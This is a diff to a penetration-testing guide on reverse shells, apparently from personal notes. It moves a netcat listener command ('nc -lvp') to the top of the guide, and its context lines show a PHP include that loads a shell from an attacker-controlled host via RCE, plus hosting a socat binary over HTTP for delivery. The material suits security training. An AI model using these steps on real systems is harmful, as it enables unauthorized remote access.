@@ -6,6 +6,14 @@ The link below contains all the reverse shell payload we will be using:
 
 {% embed url="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" %}
 
+For each of the methods, we need to start a TCP listener on a certain port to catch the shell:
+
+{% code title="Start the TCP shell listener on a port" %}
+```sh
+$ nc -lvp <port>
+```
+{% endcode %}
+
 #### 1. PHP shell
 
 a. Download the PHP shell from the link above, and load the content into a file such as `shell.php`  (remember to update the host and port values):
@@ -22,12 +30,6 @@ b. Include the address of the web server to load the PHP shell (using RCE we hav
 
 ```php
 <?php include('http://<host>:<port>/shell.php'); ?>
-```
-
-c. Start the shell listener and invoke the RCE to execute the reverse shell:
-
-```sh
-$ nc -lvp <port>
 ```
 
 #### 2. Python shell
@@ -77,10 +79,6 @@ First, download the Socat binary and host it from the local machine:
 $ https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true 
 
 $ python3 -m http.server <port>
-
-
-# from another terminal: open a reverse shell listener
-$ nc -lvp <port>
 ```
 {% endcode %}
 
